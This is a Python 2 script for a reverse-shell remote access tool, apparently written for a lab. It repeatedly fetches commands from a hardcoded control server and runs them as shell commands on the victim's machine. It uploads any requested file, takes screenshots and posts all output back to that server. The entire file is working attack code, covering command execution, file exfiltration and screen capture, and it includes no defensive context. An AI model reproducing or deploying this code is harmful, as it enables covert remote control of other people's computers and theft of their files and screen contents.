import requests 
import subprocess 
import os
import time
import tempfile # Create temproary directory in Temp folder
import shutil # Delete the temproary directory

from PIL import ImageGrab # For taking the screenshots

while True: 

    req = requests.get('http://192.168.57.129')
    command = req.text
        
    if 'close' in command:
        break

    # Data Exfilteration
    elif 'grab' in command:
        grab,path = command.split(' ')

        #Check if file exists
        try:
            if os.path.exists(path):
                url = 'http://192.168.57.129/doc'  # /doc in the URL indicates a document has been attached
                files = {'file': open(path, 'rb')}
                r = requests.post(url, files=files)

            else:
                post_response = requests.post(url='http://192.168.57.129', data='File not found on the target' )
        except Exception,e:
            post_response = requests.post(url='http://192.168.57.129', data=str(e) )

    elif 'screencap' in command:

        # Save the screenshot in temproary directory
        temp_directory = tempfile.mkdtemp()

        # Save the screenshot in the temp directory
        ImageGrab.grab().save(temp_directory+'\screenshot.jpg', 'JPEG')

        

        url = 'http://192.168.57.129/doc'  # /doc in the URL indicates a document has been attached
        files = {'file': open(temp_directory+'\screenshot.jpg', 'rb')}
        r = requests.post(url, files=files)

        # Close and remove the file along with the temproary directory
        files['file'].close()
        shutil.rmtree(temp_directory)
        
  
    else:
        CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.57.129', data=CMD.stdout.read() )
        post_response = requests.post(url='http://192.168.57.129', data=CMD.stderr.read() )

    time.sleep(3)
    
